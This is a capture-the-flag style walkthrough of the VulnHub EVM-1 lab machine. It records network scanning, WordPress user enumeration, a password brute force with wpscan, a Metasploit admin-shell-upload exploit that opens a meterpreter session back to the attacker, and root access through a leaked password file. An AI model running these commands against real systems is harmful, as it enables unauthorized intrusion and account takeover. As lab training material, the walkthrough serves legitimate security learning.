---
title: "VulnHub: EVM-1"
date: "2019-11-07"
author: frosty
categories:
  - "writeups"
tags:
  - "boot2root"
  - "vulnhub"
---

## Enumeration

Initially, we must discover what IP the target received from the DHCP server. We can use `netdiscover` to identify the IP address. From there, we perform a full port scan to identify available services. There are many ports open, so I will start with port 80 HTTP.

```sh
$ netdiscover -r 192.168.147.0/24
$ nmap -p- -sV 192.168.147.3
```

![Image](assets/img/writeups/vulnhub/evm-1/1-enumeration.png)

* * *

## Enumerating HTTP

![Image](assets/img/writeups/vulnhub/evm-1/2-landing-page-1024x686.png)

The home page is a default Apache landing page, although there is a hint on where we should go next, suggesting that that we look at `/wordpress`.

![Image](assets/img/writeups/vulnhub/evm-1/3-wp-landing-page.png)

When viewed, we see a Wordpress page setup, however notice that it is text only. Perhaps all the content has moved elsewhere. We can gather some small information, a potential username `c0rrupt3d_brain`. I say a potential username because we have not confirmed that it still exists, or that it has remained unchanged.

We can perform a `gobuster` scan to identify possible pages, and indeed find that the wordpress pages have a 301 redirect HTTP response.

```sh
$ gobuster dir \
    dir \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    -u http://192.168.147.3/wordpress
```

![Image](assets/img/writeups/vulnhub/evm-1/gobuster.png)

Instead, we can use `wpscan` to enumerate the wordpress service. Firstly, we enumerate the users. Following this, we can use wpscan to try and brute force the password.

```sh
$ wpscan --url http://192.168.147.3/wordpress --enumerate u
[...]
[i] User(s) Identified:
[+] c0rrupt3d_brain

$ wpscan --url http://192.168.147.3/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
[...]
[SUCCESS] - c0rrupt3d_brain / 24992499
```

![Image](assets/img/writeups/vulnhub/evm-1/3-wpscan-eusers.png)

![Image](assets/img/writeups/vulnhub/evm-1/4-wpscan-brute.png)

* * *

## Initial Shell

We'll use the metasploit framework `wp_admin_shell_upload` module for this and open a meterpreter session relatively easily:

```sh
$ msfconsole
> use exploit/unix/webapp/wp_admin_shell_upload
> show options
> set rhosts 192.168.147.3
> set targeturi /wordpress
> set username c0rrupt3d_brain
> set password 24992499
> set lhost 192.168.147.4
> exploit
```

![Image](assets/img/writeups/vulnhub/evm-1/5-msf.png)

![Image](assets/img/writeups/vulnhub/evm-1/6-id.png)

* * *

## Escalating Privileges

To start, we'll jump into a TTY shell, which we'll need to upgrade. We can do this with the following commands:

```sh
$ python -c 'import pty; pty.spawn("/bin/bash");'
$ stty raw -echo
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
```

From here, privielge escalation requires some enumeration. We should check the `/home` directory for some interesting files. In this case we discover a `/root3d` directory. Within this there is a hidden file which contains the root password. To switch to the root user, we issue the `$ su` command, and input the identified password. This provides the root shell!

![Image](assets/img/writeups/vulnhub/evm-1/7-enumerate.png)

![Image](assets/img/writeups/vulnhub/evm-1/9-root.png)
